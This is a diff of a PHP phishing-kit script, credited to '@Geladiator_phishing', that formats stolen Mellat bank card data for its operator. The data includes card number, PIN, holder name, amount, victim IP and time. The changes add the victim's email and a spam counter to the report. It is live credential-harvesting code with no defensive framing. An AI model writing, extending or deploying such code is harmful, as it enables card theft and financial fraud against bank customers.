@@ -62,7 +62,7 @@ $Text = "
 
 ✅ Transaction finished!
 -------------- BANK --------------
-🏦 Name : $bankname $bankinfo[1]
+🏦 Name : $bankname
 -------------- CARD --------------
 💳 Card : <code>$pan1 $pan2 $pan3 $pan4</code>
 🔐 Paas : <code>$pin</code>
@@ -71,15 +71,22 @@ $Text = "
 -------------- INFO --------------
 👤 Card Holder : <code>$holderName</code>
 💴 Amount : $amount 𝗥𝗶𝗮𝗹𝘀
+$mailinfo
 📍 IP : <code>$ip</code>
 ⏰ Time : $saat
 📝 ToDay : $roz
 📌 Date : $tarikh
 ✨ Portal : Mellat
--------------- $bankinfo[1] --------------";
+-------------- $bankname --------------$bankinfo[0]
+------------- Creator -------------
+🆔 : @Geladiator_phishing :)
+";
     
-$Text .="$bankinfo[0]";
+$Text .="\n$bankinfo[0]⁉️Spam: $num";
 
+if($sendEmail==true){
+    $Text .="\n⁉️Email: $email";
+}
 
 $T="000";
 $I= 0000;
